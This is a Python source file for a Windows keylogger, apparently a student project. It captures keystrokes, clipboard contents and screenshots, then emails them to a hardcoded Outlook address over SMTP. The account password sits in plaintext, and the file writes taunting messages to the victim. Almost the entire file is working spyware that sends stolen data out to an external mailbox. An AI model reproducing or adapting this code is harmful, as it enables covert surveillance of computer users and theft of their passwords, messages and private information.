import getpass
import smtplib
import time

# We want to add these imports in case we want to record the user's screen and send it over in video format

import pyautogui

from email import encoders
import win32clipboard
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from PIL import ImageGrab

'''print(
    "Hey, you dummy, I am now collecting all of your key logs. \nAnything that you type in, that information is now "
    "MINE. \nEnjoy using this computer while you still can!")
'''

file_path = "C:\\Users\\skyle\\SeniorProjects\\Custom Keylogger\\KeystrokeLogger\\pythonProject"  # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

with open(file_path + extend + 'stupid_dummy.txt', 'w') as f:
    f.write(
        "Hey, you dummy, I am now collecting all of your key logs. \nAnything that you type in, that information is now "
        "MINE. \nEnjoy using this computer while you still can!")

# Key information will be stored here
keys_information = "key_log.txt"

# Our clipboard information will be stored here
clipboard_information = "clipboard.txt"

# Our screenshot information will be stored here
screenshot_information = "screenshot.png"

# Video file format we will be saving
video_information = "recording.avi"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

time_iteration = 15
number_of_iterations_end = 3

email_address = "csproject432@outlook.com"  # Enter disposable email here
password = "s1339490"  # Enter email password here

username = getpass.getuser()

toaddr = "csproject432@outlook.com"  # Enter the email address you want to send your information to

# Code for recording our screen
# Screen resolution
SCREEN_SIZE = tuple(pyautogui.size())

# fourcc = cv2.VideoWriter_fourcc(*"XVID")

# Frames per second
fps = 30.0

# out = cv2.VideoWriter(video_information, fourcc, fps, SCREEN_SIZE)

vid_time = time_iteration


# email controls
def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Look at all the goods I got from this pc"

    msg.attach(MIMEText(body, 'plain'))

    # body = MIMEText("Look at all the goods I got from this pc", 'plain', 'utf-8')

    # msg.attach(body)

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.outlook.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


t = 20


def countdown(t):
    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        time.sleep(1)
        t -= 1
    print("Thanks for the info, chump.")
    send_email(keys_information, file_path + extend + keys_information, toaddr)
    exit()


# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")


copy_clipboard()


# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []
    number_of_iterations += 1


    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, 'w') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

    with Listener(on_press=on_press, on_release=on_release) as listener:
        countdown(int(t))
        listener.join()
